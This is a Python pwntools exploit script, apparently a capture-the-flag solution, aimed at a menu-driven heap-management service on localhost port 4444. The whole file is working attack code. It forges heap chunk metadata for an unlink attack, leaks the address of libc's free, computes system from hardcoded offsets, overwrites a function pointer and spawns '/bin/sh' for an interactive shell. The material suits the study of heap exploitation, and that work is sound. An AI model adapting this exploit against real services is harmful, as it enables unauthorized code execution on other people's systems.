from pwn import *
from struct import pack, unpack
s = tubes.remote.remote('localhost',4444)
def add(len_of_shellcode,content):
	s.sendlineafter('> ','2')
	s.sendlineafter('shellcode: ', str(len_of_shellcode))
	s.sendafter('): ', content)

def delete(shellcode_number):
	s.sendlineafter('> ','4') 
	s.sendlineafter(': ',str(shellcode_number))

def edit(shellcode_num,len_of_shellcode,content):
	s.sendlineafter('> ','3')
	s.sendlineafter('number: ', str(shellcode_num))
	s.sendlineafter('shellcode: ', str(len_of_shellcode))
	s.sendlineafter('shellcode: ', content)

def List():
	print s.sendlineafter('> ','1'),'1'
	return s.recvuntil('SHELLC0DE 3: ')
add(256,256*'A')
add(256,256*'B')
add(256,256*'C')
add(256,256*'D')
add(256,256*'E')
add(256,256*'F')
add(256,256*'G')
add(256,256*'H')
#gdb.attach(s, '''x/20xg 0x6016C0''')
delete(1)
delete(3)
delete(5)
#delete(7)
#gdb.attach(s, '''x/20xg 0x6016C0
#               b *0x0000000000400BB7''')
#add(256,'X'*256)
#edit(0,2*256,pack('Q',0)+pack('Q',1)+pack('Q',0x6016e8)+pack('Q',0x6016f0)+'a'*(0x100-0x20) + pack('Q',0x100)+pack('Q',0x110)+pack('Q',0x6016b8)+pack('Q',0x6016c0)+(0x100-0x20)*'b')
#gdb.attach(s, '''x/20xg 0x6016C0
#                b *0x0000000000400BB7''')
edit(0,2*256,'1'*256+pack('Q',0x0)+pack('Q',0x111)+pack('Q',0x6016b8)+pack('Q',0x6016c0)+'a'*(0x100-0x20))
#gdb.attach(s, '''x/20xg 0x6016C0
#		b *0x0000000000400BB7''')

add(256,256*'X')
#gdb.attach(s)
#edit(0,0x20,pack('Q',0)+pack('Q',1)+pack('Q',8)+pack('Q',0x000000601600))
edit(0,0x200,pack('Q',0x100)+pack('Q',0x100)+pack('Q',0x6016b8)+pack('Q',0x6016b8)+(pack('Q',0x100)+pack('Q',0x100)+pack('Q',0x6016b0)+pack('Q',0x6016b8))*0xf)
add(256,pack('Q',0x100)+pack('Q',0x601600)+pack('Q',1)+pack('Q',0x100)+pack('Q',0x601620)+(256-16-24)*'\x00')


edit(1,0x8,'/bin/sh\x00')
free_address = List()
print free_address
print s.recvuntil('>')
pos = free_address.find(': ')
free_addr = free_address[pos+2:pos+18]
free_address =  unpack('<Q',free_addr.decode('hex'))[0]
print hex(free_address)
offset = 0x82df0 - 0x46640#52C
sys_addr = free_address - offset
print hex(sys_addr)

#edit(0,8,pack('Q',sys_addr))
#edit(3,8,'/bin/sh\x00')
s.sendline('3')
s.sendlineafter('number: ', '0')
s.sendlineafter('shellcode: ', '8')
s.sendlineafter('shellcode: ',pack('Q',sys_addr))



#gdb.attach(s, '''x/20xg 0x6016B8''')

delete(1)
s.interactive()

